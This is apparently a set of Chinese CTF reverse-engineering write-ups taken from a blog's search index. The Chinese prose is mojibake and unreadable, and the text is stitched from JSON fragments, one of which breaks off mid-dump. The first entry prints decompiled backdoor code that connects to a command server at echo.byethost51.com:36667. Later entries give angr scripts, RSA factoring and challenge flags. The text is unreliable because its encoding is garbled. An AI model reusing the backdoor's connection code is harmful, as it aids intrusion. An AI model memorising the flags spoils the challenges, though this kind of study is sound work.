å‘ç°/tmpé‡Œæœ‰ä¸ªbackdooræ–‡ä»¶ï¼Œè¿™ä¹Ÿå¤ªæ˜æ˜¾äº†ï¼Œä¸è¿‡è¦æ˜¯è—èµ·æ¥å¯èƒ½è¿˜çœŸæ‰¾ä¸ç€ æ‹–idaåˆ†æ å…ˆçœ‹stringçª—å£ç›´æ¥å°±çœ‹åˆ°äº† echo.byethost51.com ç›²çŒœå°±æ˜¯é¢˜ç›®è¦çš„æœåŠ¡å™¨åœ°å€ï¼Œç‚¹è¿›å»çœ‹åˆ°å˜é‡åcommServerï¼Œç¡®ä¿¡ æŸ¥äº¤å‰å¼•ç”¨æ‰¾åˆ°äº†ininConnextion()å‡½æ•° bool initConnection() { char *v0; // r0 char s[512]; // [sp+4h] [bp-208h] BYREF int v3; // [sp+204h] [bp-8h] memset(s, 0, sizeof(s)); if ( mainCommSock ) { close(mainCommSock); mainCommSock = 0; } if ( currentServer ) ++currentServer; else currentServer = 0; strcpy(s, (\u0026commServer)[currentServer]); v3 = 36667; if ( strchr(s, 58) ) { v0 = strchr(s, 58); v3 = atoi(v0 + 1); *strchr(s, 58) = 0; } mainCommSock = socket(2, 1, 0); return connectTimeout(mainCommSock, s, v3, 30) == 0; } ç›²çŒœç«¯å£å·å°±æ˜¯v3=36667ï¼Œå®åœ¨å¤ªåƒäº† äºæ˜¯flag{MD5(echo.byethost51.com:36667)}=flag{33a422c45d551ac6e4756f59812a954b} correctï¼ ç¬¬äº”å‘¨ 2021-11-29 è¡¥ä¸Šå‘¨ï¼Œè™½è¿Ÿä½†åˆ° ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:9:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x00 DDCTF Android Easy ä¸‹è½½é™„ä»¶æ˜¯ä¸ªzip åç¼€æ”¹ä¸ºapkç”¨jebæ‰“å¼€ æ‰“å¼€FlagActivityæ–‡ä»¶çœ‹java ç”šè‡³éƒ½ä¸ç”¨ç®—(( flag{DDCTF-3ad60811d87c4a2dba0ef651b2d93476@didichuxing.com} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:10:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x01 WELCOME TO JNI ã€ç»´åŸºç™¾ç§‘ã€‘ JNI ï¼ˆJava Native Interfaceï¼ŒJavaæœ¬åœ°æ¥å£ï¼‰æ˜¯ä¸€ç§ç¼–ç¨‹æ¡†æ¶ï¼Œä½¿å¾—Javaè™šæ‹Ÿæœºä¸­çš„Javaç¨‹åºå¯ä»¥è°ƒç”¨æœ¬åœ°åº”ç”¨/æˆ–åº“ï¼Œä¹Ÿå¯ä»¥è¢«å…¶ä»–ç¨‹åºè°ƒç”¨ã€‚ æœ¬åœ°ç¨‹åºä¸€èˆ¬æ˜¯ç”¨å…¶å®ƒè¯­è¨€ï¼ˆCã€C++æˆ–æ±‡ç¼–è¯­è¨€ç­‰ï¼‰ç¼–å†™çš„ï¼Œå¹¶ä¸”è¢«ç¼–è¯‘ä¸ºåŸºäºæœ¬æœºç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„ç¨‹åºã€‚ ä¸‹è½½é™„ä»¶æ˜¯apkï¼Œç›´æ¥è¿›jebï¼Œæ‰“å¼€MainActivity public class MainActivity extends AppCompatActivity { static { System.loadLibrary(\"native-lib\"); } public native boolean loginUtils(String arg1) { } @Override // androidx.appcompat.app.AppCompatActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main this.findViewById(0x7F080057).setOnClickListener(new View.OnClickListener() { // id:button @Override // android.view.View$OnClickListener public void onClick(View v) { boolean ok = MainActivity.this.loginUtils(((EditText)MainActivity.this.findViewById(0x7F0800B5)).getText().toString()); // id:inputBox Toast.makeText(MainActivity.this.getApplicationContext(), ok ? \"RIGHT!!!!\" : \"WRONG!!!!\", 1).show(); } }); } } ç»å«æ ‘å¸ˆå‚…æŒ‡ç‚¹å¾—çŸ¥stem.loadLibrary(\"native-lib\");å°±æ˜¯JNIçš„æ ‡å¿— æŠŠé™„ä»¶åç¼€æ”¹ä¸ºzipï¼Œæ‰“å¼€libæ–‡ä»¶å¤¹ï¼Œé‡Œé¢å³native-lib å››ä¸ªæ–‡ä»¶å¤¹å†…å®¹åŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯æ¶æ„ä¸åŒ éšä¾¿æ‹–ä¸€ä¸ªè¿›idaï¼ˆä¸€å®šè¦å…ˆè§£å‹ã€‚ã€‚ã€‚ï¼‰ æŸ¥stringå°±èƒ½çœ‹åˆ°flag{welcome_to_naive_lib!} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:11:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x02 Codegate CTF Redvelvet dieæŸ¥ï¼Œelf64ï¼Œè¿›idaï¼Œå‡½æ•°åˆ—è¡¨æ‰¾main v40 = __readfsqword(40u); strcpy(s2, \"0a435f46288bb5a764d13fca6c901d3750cee73fd7689ce79ef6dc0ff8f380e5\"); v36 = 0LL; v37 = 0LL; v38 = 0LL; v39 = 0; printf(\"Your flag : \"); fgets(\u0026s, 27, edata); func1(s, v8); func2((unsigned int)v8, (unsigned int)v9); func3((unsigned int)v9, (unsigned int)v10); func4((unsigned int)v10, (unsigned int)v11); func5((unsigned int)v11, (unsigned int)v12); func6((unsigned int)v12, (unsigned int)v13, (unsigned int)v14); func7((unsigned int)v14, (unsigned int)v15, (unsigned int)v16); func8((unsigned int)v16, (unsigned int)v17, (unsigned int)v18); func9((unsigned int)v18, (unsigned int)v19, (unsigned int)v20); func10((unsigned int)v20, (unsigned int)v21, (unsigned int)v22); func11((unsigned int)v22, (unsigned int)v23, (unsigned int)v24); func12((unsigned int)v24, (unsigned int)v25, (unsigned int)v26); func13((unsigned int)v26, (unsigned int)v27, (unsigned int)v28); func14((unsigned int)v28, (unsigned int)v29, (unsigned int)v30); func15((unsigned int)v30, (unsigned int)v31, (unsigned int)v32); SHA256_Init((__int64)v6); v3 = strlen(\u0026s); SHA256_Update(v6, \u0026s, v3); SHA256_Final(v33, v6); for ( i = 0; i \u003c= 31; ++i ) sprintf(\u0026s1[2 * i], \"%02x\", (unsigned __int8)v33[i]); if ( strcmp(s1, s2) ) exit(1); printf(\"flag : {\\\" %s \\\"}\\n\", \u0026s); return 0; åŸºæœ¬é€»è¾‘æ˜¯å¯¹è¾“å…¥èµ°15ä¸ªfunctionï¼Œç„¶åSHA256åŠ å¯†å’Œs2æ¯”è¾ƒ ç›´æ¥ä¸Šangr ä½†è¿™é‡Œéœ€è¦æ³¨æ„ï¼ŒSHA256ä¸å¯é€†ï¼Œæ‰€ä»¥findç›´æ¥è®¾åœ¨cmpå¤„angrç®—ä¸å‡ºæ¥ è€Œä»SHA256ä¹‹å‰åˆ°cmpåªæœ‰ä¸€æ¡è·¯ï¼Œæ‰€ä»¥findè®¾åœ¨åŠ å¯†ä¹‹å‰å°±è¡Œäº†,è€Œavoidè®¾åœ¨exit()å‡½æ•°å¤„å°±è¡Œ In [1]: import angr In [2]: proj = angr.Project('./RedVelvet',auto_load_libs=False) In [3]: state = proj.factory.entry_state() In [4]: simgr = proj.factory.simgr(state) In [5]: simgr.explore(find=0x401537,avoid=0x4007D0) æç¤ºOut[5]: \u003cSimulationManager with 1 found, 63 avoid\u003e è¾“å‡º In [6]: print(simgr.found[0].posix.dumps(0)) b'What_You_Wanna_Be?:)_la_la' è¿™é‡Œè¯´æ˜ä¸€ä¸‹ï¼Œä¸Šé¢çš„æ˜¯æ­£ç¡®ç­”æ¡ˆ ä½†å…¶å®æˆ‘ç¬¬ä¸€æ¬¡è·‘å‡ºæ¥æ˜¯b'What_You_Wanna_Be?:)_lc_la,å·®äº†ä¸€ä¸ªå­—æ¯ å½“æˆ‘å†™è¿™ç¯‡wpæ—¶åˆè·‘äº†ä¸€éï¼Œç­”æ¡ˆå´æ˜¯å¯¹çš„ ä¸¤æ¬¡è„šæœ¬å®Œå…¨ä¸€æ ·ï¼Œangrä¹Ÿéƒ½æ²¡æç¤ºå¤šè§£ï¼Œä½†è¾“å‡ºå´ä¸åŒ è¿™æ‰å°è¯äº†RXå¸ˆå‚…æ‰€è¯´ï¼Œç²˜å‡ å¼ èŠå¤©è®°å½• ç”¨æˆ‘çš„è¯æ¥è¯´å°±æ˜¯ï¼š 1.angrå¯¹äºå·²ç»èµ°é€šçš„è·¯ä¸ä¼šå†èµ°ç¬¬äºŒé 2.æ¯ä¸€æ¬¡å…ˆèµ°å“ªæ¡è·¯ï¼ˆå¾—åˆ°å“ªä¸ªç­”æ¡ˆï¼‰æ˜¯éšæœºçš„ æ‰€ä»¥å‡ºé—®é¢˜æ—¶ï¼ˆangrè®¡ç®—ä¸å‡†ç¡®ï¼‰å¤§å¯ä»¥å¤šæ¥ä¸¤éï¼ˆ ç¬¬å››å‘¨ 2021-11-20 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:12:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x00 DMCTF2020 re3 ä¸€ç§å¸¸è§çš„ç®—æ³•ã€‚ dieæŸ¥ï¼ŒELF64ï¼Œè¿›ida ç»“åˆtipsä½¿ç”¨Findcryptæ’ä»¶ å‡½æ•°åˆ—è¡¨å®šä½mainå‡½æ•° __int64 __fastcall main(int a1, char **a2, char **a3) { unsigned int v3; // eax int i; // [rsp+1Ch] [rbp-C4h] char v6[96]; // [rsp+20h] [rbp-C0h] BYREF char v7[16]; // [rsp+80h] [rbp-60h] BYREF char s[32]; // [rsp+90h] [rbp-50h] BYREF char s1[40]; // [rsp+B0h] [rbp-30h] BYREF unsigned __int64 v10; // [rsp+D8h] [rbp-8h] v10 = __readfsqword(0x28u); puts(::s); memset(s, 0, 0x14uLL); read(0, s, 5uLL); sub_90A(v6); v3 = strlen(s); sub_956(v6, s, v3); sub_AA4(v6, v7); for ( i = 0; i \u003c= 15; ++i ) sprintf(\u0026s1[2 * i], \"%02x\", (unsigned __int8)v7[i]); if ( !strcmp(s1, Big_Numbers1_203060) ) printf(\"right\"); getchar(); return 0LL; } Findcryptç»“æœ .data:0000000000203060 global Big_Numbers1_203060 $c0 b'21232f297a57a5a743894a0e4a801fc3' éš¾é“æœ‰ç§ç®—æ³•å«bignumbersï¼Ÿ ç™¾åº¦æ— æœï¼Œäºæ˜¯å°è¯•ææ‡‚åŠ å¯†é€»è¾‘ï¼Œæ‰‹åŠ¨é€†ï¼ˆå¤©çœŸ.jpg) ç„¶åå°±æ²¡æœ‰ç„¶åäº†ï¼ˆ å·çœ‹å¸ˆå‚…ä»¬çš„é¢˜è§£,åŸæ¥bignumbersæ˜¯MD5çš„å¯†æ–‡ï¼Ÿï¼Ÿï¼Ÿ ç½‘ç«™æ’å‡ºflag{admin} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:12:1","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x01 ACTF2020 Oruga åˆæ˜¯ç†Ÿæ‚‰çš„è¿·å®«â€¦â€¦ç­‰ä¸‹è¿™æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Ÿ dieæŸ¥ï¼ŒElf64ï¼Œè¿›ida è¿·å®«é€»è¾‘å‡½æ•° _BOOL8 __fastcall sub_78A(__int64 a1) { int v2; // [rsp+Ch] [rbp-Ch] int v3; // [rsp+10h] [rbp-8h] int v4; // [rsp+14h] [rbp-4h] v2 = 0; v3 = 5; v4 = 0; while ( byte_201020[v2] != 33 ) { v2 -= v4; if ( *(_BYTE *)(v3 + a1) != 'W' || v4 == -16 ) { if ( *(_BYTE *)(v3 + a1) != 'E' || v4 == 1 ) { if ( *(_BYTE *)(v3 + a1) != 'M' || v4 == 16 ) { if ( *(_BYTE *)(v3 + a1) != 'J' || v4 == -1 ) return 0LL; v4 = -1; } else { v4 = 16; } } else { v4 = 1; } } else { v4 = -16; } ++v3; while ( !byte_201020[v2] ) { if ( v4 == -1 \u0026\u0026 (v2 \u0026 0xF) == 0 ) return 0LL; if ( v4 == 1 \u0026\u0026 v2 % 16 == 15 ) return 0LL; if ( v4 == 16 \u0026\u0026 (unsigned int)(v2 - 240) \u003c= 0xF ) return 0LL; if ( v4 == -16 \u0026\u0026 (unsigned int)(v2 + 15) \u003c= 0x1E ) return 0LL; v2 += v4; } } return *(_BYTE *)(v3 + a1) == 125; } å¯ä»¥çœ‹å‡ºbyte_201020æ˜¯åœ°å›¾ï¼Œå…±256byteï¼Œå³16*16çš„åœ°å›¾ v2æ˜¯å½“å‰æ‰€åœ¨çš„ä½ç½®ï¼Œv4æ˜¯åç§»é‡ï¼Œ1-rightï¼Œ-1-leftï¼Œ16-downï¼Œ-16-up ä¸Šé¢çš„whileé‡Œå››ä¸ªifå¯ä»¥ç›´æ¥å¯¹åº”elseç»™v4èµ‹å€¼ï¼Œå³W-up E-right M-down J-left ä¸‹é¢çš„whileå‡½æ•°é‡Œå››ä¸ªifåº”è¯¥æ˜¯è¾¹ç•Œåˆ¤æ–­ ç„¶åå¾ªç¯ä¸€ç›´å¾€ä¸€ä¸ªæ–¹å‘èµ°ï¼Œç›´åˆ°ç¢°åˆ°å­—ç¬¦ çŸ¥é“äº†è¿™äº›ï¼Œæ‰èƒ½ææ‡‚ä¸Šé¢å››ä¸ªifé‡Œ||v4==xxè¿™ä¸ªæ¡ä»¶æ˜¯åœ¨å¹²å•¥ å¯ä»¥å‘ç°è¿™ä¸ªæ¡ä»¶å’Œä¸‹é¢elseé‡Œç»™v4çš„èµ‹å€¼æ˜¯ä¸€æ ·çš„ å³å¦‚æœä¸‹ä¸€æ­¥å’Œä¸Šä¸€æ­¥æ˜¯ä¸€æ ·çš„ï¼Œä½†ä¸Šä¸€æ­¥å·²ç»èµ°åˆ°äº†è¿™ä¸ªæ–¹å‘æ‰€èƒ½èµ°çš„æœ€è¿œå¤„ï¼Œè¿™ä¸€æ­¥å°±æ˜¯æ— æ•ˆçš„ å¦‚æœå‡ºç°æ— æ•ˆçš„é‡å¤å‘½ä»¤ï¼Œifåˆ¤æ–­ä¼šä¸€è·¯ç•…é€šï¼Œç›´æ¥return 0 è‡³æ­¤ï¼Œæ‰‹åŠ¨èµ°åœ°å›¾å¾—flagï¼šactf{MEWEMEWJMEWJM} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:13:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0Ã—02 ç½‘é¼æ¯2020 signal å°è¯•ä¸€ä¸‹æŸä¸ªè‡ªåŠ¨åŒ–é€†å‘å·¥å…·ï¼Ÿ æ„Ÿè°¢RXç»†å¿ƒåˆè€å¿ƒè®²è§£ç¬¦å·æ‰§è¡Œ angrç›´æ¥æä»– project = angr.Project('./signal.exe',auto_load_libs = False) state = project.factory.entry_state() simgr = project.factory.simgr(state) simgr.explore(find = 0x40179E,avoid =0x401539) print(simgr.found[0].posix.dumps(0)) å¾—flag{757515121f3d478}ï¼ŒçœŸé¦™ ç¬¬ä¸‰å‘¨ 2021-11-13 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:14:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0Ã—00 SUCTF2019 Signin ä½ è®¤è¯†è¿™ä¸ªç®—æ³•å˜› ä¸è®¤è¯†ï¼Œç„¶åæ ¹æ®é¢˜è§£å…ˆå»å­¦RSAå’Œgmpy2åº“ï¼Œæ–­æ–­ç»­ç»­å­¦äº†å‡ å¤©ï¼ˆï¼ˆ è´´ä¸ªé“¾æ¥å§ï¼Œä¾¿äºä»¥åå¤ä¹  RSA gmpy2åº“å¸¸è§å‡½æ•° dieæŸ¥å£³ï¼Œæ— ï¼Œç„¶åè¿›idaï¼Œç›´æ¥æ ¹æ®å‡½æ•°åˆ—è¡¨å®šä½mainå‡½æ•° __int64 __fastcall main(int a1, char **a2, char **a3) { char v4[16]; // [rsp+0h] [rbp-4A0h] BYREF char v5[16]; // [rsp+10h] [rbp-490h] BYREF char v6[16]; // [rsp+20h] [rbp-480h] BYREF char v7[16]; // [rsp+30h] [rbp-470h] BYREF char v8[112]; // [rsp+40h] [rbp-460h] BYREF char v9[1000]; // [rsp+B0h] [rbp-3F0h] BYREF unsigned __int64 v10; // [rsp+498h] [rbp-8h] v10 = __readfsqword(0x28u); puts(\"[sign in]\"); printf(\"[input your flag]: \"); __isoc99_scanf(\"%99s\", v8); sub_96A(v8, v9); __gmpz_init_set_str(v7, \"ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\", 16LL); __gmpz_init_set_str(v6, v9, 16LL); __gmpz_init_set_str(v4, \"103461035900816914121390101299049044413950405173712170434161686539878160984549\", 10LL); __gmpz_init_set_str(v5, \"65537\", 10LL); __gmpz_powm(v6, v6, v5, v4); if ( (unsigned int)__gmpz_cmp(v6, v7) ) puts(\"GG!\"); else puts(\"TTTTTTTTTTql!\"); return 0LL; } æ ¹æ®RSAçš„å½¢å¼ç¨å¾®é‡å‘½åä¸€ä¸‹å˜é‡ v10 = __readfsqword(0x28u); puts(\"[sign in]\"); printf(\"[input your flag]: \"); __isoc99_scanf(\"%99s\", input); sub_96A(input, v9); __gmpz_init_set_str(c, \"ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\", 16LL); __gmpz_init_set_str(calc, v9, 16LL); __gmpz_init_set_str(n, \"103461035900816914121390101299049044413950405173712170434161686539878160984549\", 10LL); __gmpz_init_set_str(e, \"65537\", 10LL); __gmpz_powm(calc, calc, e, n); if ( (unsigned int)__gmpz_cmp(calc, c) ) // calcæ˜¯æ ¹æ®inputè®¡ç®—å‡ºçš„å¯†æ–‡ï¼Œcæ˜¯å®é™…çš„å¯†æ–‡ puts(\"GG!\"); else puts(\"TTTTTTTTTTql!\"); return 0LL; å…ˆç”¨yafuåˆ†è§£nï¼Œç”±äºå†™è¿™ç¯‡æ–‡ç« æ—¶æ˜¯ç¬¬äºŒæ¬¡åˆ†è§£næ‰€ä»¥æ¯”è¾ƒå¿« C:\\Users\\DX3906\u003eD:\\reserve\\yafu\\yafu-x64.exe factor(103461035900816914121390101299049044413950405173712170434161686539878160984549) fac: factoring 103461035900816914121390101299049044413950405173712170434161686539878160984549 fac: using pretesting plan: normal fac: no tune info: using qs/gnfs crossover of 95 digits starting SIQS on c78: 103461035900816914121390101299049044413950405173712170434161686539878160984549 ==== sieving in progress (1 thread): 36224 relations needed ==== ==== Press ctrl-c to abort and save state ==== SIQS elapsed time = 1.0985 seconds. Total factoring time = 1.1195 seconds ***factors found*** P39 = 282164587459512124844245113950593348271 P39 = 366669102002966856876605669837014229419 ans = 1 å¾—åˆ° p=282164587459512124844245113950593348271 q=366669102002966856876605669837014229419 å·²çŸ¥n,p,q,eï¼Œå…ˆæ±‚d import gmpy2 n=103461035900816914121390101299049044413950405173712170434161686539878160984549 p=282164587459512124844245113950593348271 q=366669102002966856876605669837014229419 e=65537 l=(p-1)*(q-1) d=gmpy2.invert(e,l) å·²çŸ¥n,d,c,æ±‚æ˜æ–‡ c=0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35 flag=gmpy2.powmod(c,d,n) from Crypto.Util.number import * print(long_to_bytes(flag)) # b'suctf{Pwn_@_hundred_years}' ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:15:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0Ã—01 FlareOn6 Overlang dieæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼ŒPE32ï¼Œæ‹–è¿›ida ç«Ÿç„¶å°±ä¸‰ä¸ªå‡½æ•°ï¼Œstartå‡½æ•°åº”è¯¥æ˜¯ä¸»è¦çš„ int __stdcall start(int a1, int a2, int a3, int a4) { CHAR Text[128]; // [esp+0h] [ebp-84h] BYREF int v6; // [esp+80h] [ebp-4h] v6 = sub_401160(Text, \u0026unk_402008, 28); Text[v6] = 0; MessageBoxA(0, Text, Caption, 0); return 0; } sub_401160å‡½æ•°åƒæ˜¯æŠŠunk_402008çš„å‰28ä½å¤åˆ¶ç»™Textï¼Œç„¶åé€šè¿‡MessageBoxAè¾“å‡ºTextå’ŒCaption è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ‰“å¼€unk_402008çœ‹çœ‹ .rdata:00402008 unk_402008 db 0E0h ; DATA XREF: start+Bâ†‘o .rdata:00402009 db 81h .rdata:0040200A db 89h .rdata:0040200B db 0C0h .rdata:0040200C db 0A0h .rdata:0040200D db 0C1h .rdata:0040200E db 0AEh .rdata:0040200F db 0E0h .rdata:00402010 db 81h .rdata:00402011 db 0A5h .rdata:00402012 db 0C1h .rdata:00402013 db 0B6h .rdata:00402014 db 0F0h .rdata:00402015 db 80h ; â‚¬ .rdata:00402016 db 81h .rdata:00402017 db 0A5h .rdata:00402018 db 0E0h .rdata:00402019 db 81h .rdata:0040201A db 0B2h .rdata:0040201B db 0F0h .rdata:0040201C db 80h ; â‚¬ .rdata:0040201D db 80h ; â‚¬ .rdata:0040201E db 0A0h .rdata:0040201F db 0E0h .rdata:00402020 db 81h .rdata:00402021 db 0A2h .rdata:00402022 db 72h ; r .rdata:00402023 db 6Fh ; o .rdata:00402024 db 0C1h .rdata:00402025 db 0ABh .rdata:00402026 db 65h ; e .rdata:00402027 db 0E0h .rdata:00402028 db 80h ; â‚¬ .rdata:00402029 db 0A0h .rdata:0040202A db 0E0h .rdata:0040202B db 81h .rdata:0040202C db 0B4h .rdata:0040202D db 0E0h .rdata:0040202E db 81h .rdata:0040202F db 0A8h .rdata:00402030 db 0C1h .rdata:00402031 db 0A5h .rdata:00402032 db 20h .rdata:00402033 db 0C1h .rdata:00402034 db 0A5h .rdata:00402035 db 0E0h .rdata:00402036 db 81h .rdata:00402037 db 0AEh .rdata:00402038 db 63h ; c .rdata:00402039 db 0C1h .rdata:0040203A db 0AFh .rdata:0040203B db 0E0h .rdata:0040203C db 81h .rdata:0040203D db 0A4h .rdata:0040203E db 0F0h .rdata:0040203F db 80h ; â‚¬ .rdata:00402040 db 81h .rdata:00402041 db 0A9h .rdata:00402042 db 6Eh ; n .rdata:00402043 db 0C1h .rdata:00402044 db 0A7h .rdata:00402045 db 0C0h .rdata:00402046 db 0BAh .rdata:00402047 db 20h .rdata:00402048 db 49h ; I .rdata:00402049 db 0F0h .rdata:0040204A db 80h ; â‚¬ .rdata:0040204B db 81h .rdata:0040204C db 9Fh .rdata:0040204D db 0C1h .rdata:0040204E db 0A1h .rdata:0040204F db 0C1h .rdata:00402050 db 9Fh .rdata:00402051 db 0C1h .rdata:00402052 db 8Dh .rdata:00402053 db 0E0h .rdata:00402054 db 81h .rdata:00402055 db 9Fh .rdata:00402056 db 0C1h .rdata:00402057 db 0B4h .rdata:00402058 db 0F0h .rdata:00402059 db 80h ; â‚¬ .rdata:0040205A db 81h .rdata:0040205B db 9Fh .rdata:0040205C db 0F0h .rdata:0040205D db 80h ; â‚¬ .rdata:0040205E db 81h .rdata:0040205F db 0A8h .rdata:00402060 db 0C1h .rdata:00402061 db 9Fh .rdata:00402062 db 0F0h .rdata:00402063 db 80h ; â‚¬ .rdata:00402064 db 81h .rdata:00402065 db 0A5h .rdata:00402066 db 0E0h .rdata:00402067 db 81h .rdata:00402068 db 9Fh .rdata:00402069 db 0C1h .rdata:0040206A db 0A5h .rdata:0040206B db 0E0h .rdata:0040206C db 81h .rdata:0040206D db 9Fh .rdata:0040206E db 0F0h .rdata:0040206F db 80h ; â‚¬ .rdata:00402070 db 81h .rdata:00402071 db 0AEh .rdata:00402072 db 0C1h .rdata:00402073 db 9Fh .rdata:00402074 db 0F0h .rdata:00402075 db 80h ; â‚¬ .rdata:00402076 db 81h .rdata:00402077 db 83h .rdata:00402078 db 0C1h .rdata:00402079 db 9Fh .rdata:0040207A db 0E0h .rdata:0040207B db 81h .rdata:0040207C db 0AFh .rdata:0040207D db 0E0h .rdata:0040207E db 81h .rdata:0040207F db 9Fh .rdata:00402080 db 0C1h .rdata:00402081 db 84h .rdata:00402082 db 5Fh ; _ .rdata:00402083 db 0E0h .rdata:00402084 db 81h .rdata:00402085 db 0A9h .rdata:00402086 db 0F0h .rdata:00402087 db 80h ; â‚¬ .rdata:00402088 db 81h .rdata:00402089 db 9Fh .rdata:0040208A db 6Eh ; n .rdata:0040208B db 0E0h .rdata:0040208C db 81h .rdata:0040208D db 9Fh .rdata:0040208E db 0E0h .rdata:0040208F db 81h .rdata:00402090 db 0A7h .rdata:00402091 db 0E0h .rdata:00402092 db 81h .rdata:00402093 db 80h ; â‚¬ .rdata:00402094 db 0F0h .rdata:00402095 db 80h ; â‚¬ .rdata:00402096 db 81h .rdata:00402097 db 0A6h .rdata:00402098 db 0F0h .rdata:00402099 db 80h ; â‚¬ .rdata:0040209A db 81h .rdata:0040209B db 0ACh .rdata:0","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:16:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0Ã—02 BJDCTF2020 easy å’Œä¸Šé“é¢˜æœ‰å¼‚æ›²åŒå·¥ä¹‹å¤„ï¼Ÿ dieæŸ¥ï¼Œç»“æœPE32ï¼Œè¿›ida ç›´æ¥å®šä½mainå‡½æ•° int __cdecl main(int argc, const char **argv, const char **envp) { __time32_t Time; // [esp+10h] [ebp-3F0h] BYREF struct tm *v5; // [esp+3FCh] [ebp-4h] __main(); time(\u0026Time); v5 = localtime(\u0026Time); puts(\"Can you find me?\\n\"); system(\"pause\"); return 0; } å„ç§timeç»™æˆ‘æ•´è’™äº†ï¼Œç‰¹æ„ç™¾åº¦æŸ¥äº†ä¸€ä¸‹å‘ç°å¥½åƒçœŸæ²¡ä»€ä¹ˆç”¨ å’Œä¸Šä¸€é¢˜æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™?ç›´æ¥å»ç¿»å‚æ•°åˆ—è¡¨ .text:00401725 push ebp .text:00401726 mov ebp, esp .text:00401728 and esp, 0FFFFFFF0h .text:0040172B sub esp, 400h .text:00401731 call ___main .text:00401736 lea eax, [esp+400h+var_3F0] .text:0040173A mov [esp+400h+Time], eax ; Time .text:0040173D call _time .text:00401742 lea eax, [esp+400h+var_3F0] .text:00401746 mov [esp+400h+Time], eax ; Time .text:00401749 call _localtime .text:0040174E mov [esp+400h+var_4], eax .text:00401755 mov [esp+400h+Time], offset Buffer ; \"Can you find me?\\n\" .text:0040175C call _puts .text:00401761 mov [esp+400h+Time], offset Command ; \"pause\" .text:00401768 call _system .text:0040176D mov eax, 0 .text:00401772 leave .text:00401773 retn ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ï¼Œæ¯«æ— å¤´ç»ª ç¿»å‡½æ•°åˆ—è¡¨çš„æ—¶å€™å‘ç°äº†é—®é¢˜ï¼Œå°±æ˜¯è¿™ä¸ª_queså‡½æ•°ï¼Œ int ques() { int v0; // edx int result; // eax int v2[50]; // [esp+20h] [ebp-128h] BYREF int v3; // [esp+E8h] [ebp-60h] int v4[10]; // [esp+ECh] [ebp-5Ch] int j; // [esp+114h] [ebp-34h] __int64 v6; // [esp+118h] [ebp-30h] int v7; // [esp+124h] [ebp-24h] int v8; // [esp+128h] [ebp-20h] int i; // [esp+12Ch] [ebp-1Ch] v3 = 2147122737; v4[0] = 140540; v4[1] = -2008399303; v4[2] = 141956; v4[3] = 139457077; v4[4] = 262023; v4[5] = -2008923597; v4[6] = 143749; v4[7] = 2118271985; v4[8] = 143868; for ( i = 0; i \u003c= 4; ++i ) { memset(v2, 0, sizeof(v2)); v8 = 0; v7 = 0; v0 = v4[2 * i]; LODWORD(v6) = *(\u0026v3 + 2 